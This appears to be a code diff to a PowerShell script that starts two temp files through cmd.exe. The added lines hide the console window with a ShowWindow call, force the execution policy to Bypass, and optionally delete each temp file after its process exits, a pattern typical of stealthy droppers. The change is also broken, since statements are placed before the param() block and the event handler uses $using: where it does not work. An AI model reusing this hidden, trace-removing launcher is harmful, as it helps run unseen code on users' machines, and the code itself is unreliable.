@@ -1,3 +1,13 @@
+Add-Type -Name Win32 -Namespace Win32Functions -MemberDefinition @"
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
+"@
+
+$consolePtr = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle
+[Win32Functions.Win32]::ShowWindow($consolePtr, 0) | Out-Null
+
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
 param(
     [string]$file_ending1 = "YOUR_FILE_ENDING_HERE1",
     [string]$file_ending2 = "YOUR_FILE_ENDING_HERE2",
@@ -10,9 +20,26 @@ function Delete-TempFile {
     )
     try {
         Remove-Item -Path $tempFile -Force
-        Write-Host 'Temp file deleted successfully.'
+        Write-Host "Temp file '$tempFile' deleted successfully."
     } catch {
-        Write-Error 'Error deleting temp file:'
+        Write-Error "Error deleting temp file '$tempFile':"
+    }
+}
+
+function Start-CmdProcess {
+    param (
+        [string]$tempFile,
+        [array]$cmdArgs
+    )
+
+    $allArgs = @("/C", "start", $tempFile) + $cmdArgs
+
+    $process = Start-Process -FilePath "cmd.exe" -ArgumentList $allArgs -NoNewWindow -PassThru
+
+    if ($remove) {
+        Register-ObjectEvent -InputObject $process -EventName Exited -Action {
+            Delete-TempFile -tempFile $using:tempFile
+        }
     }
 }
 
@@ -29,18 +56,8 @@ function Main {
 
     $cmdArgs = $args
 
-    $allArgs1 = @("/C", "start", $tempDir1) + $cmdArgs
-    $allArgs2 = @("/C", "start", $tempDir2) + $cmdArgs
-
-    Start-Process -FilePath "cmd.exe" -ArgumentList $allArgs1 -NoNewWindow -Wait
-    if ($remove) {
-        Delete-TempFile -tempFile $tempDir1
-    }
-
-    Start-Process -FilePath "cmd.exe" -ArgumentList $allArgs2 -NoNewWindow -Wait
-    if ($remove) {
-        Delete-TempFile -tempFile $tempDir2
-    }
+    Start-CmdProcess -tempFile $tempDir1 -cmdArgs $cmdArgs
+    Start-CmdProcess -tempFile $tempDir2 -cmdArgs $cmdArgs
 }
 
 Main @PSBoundParameters
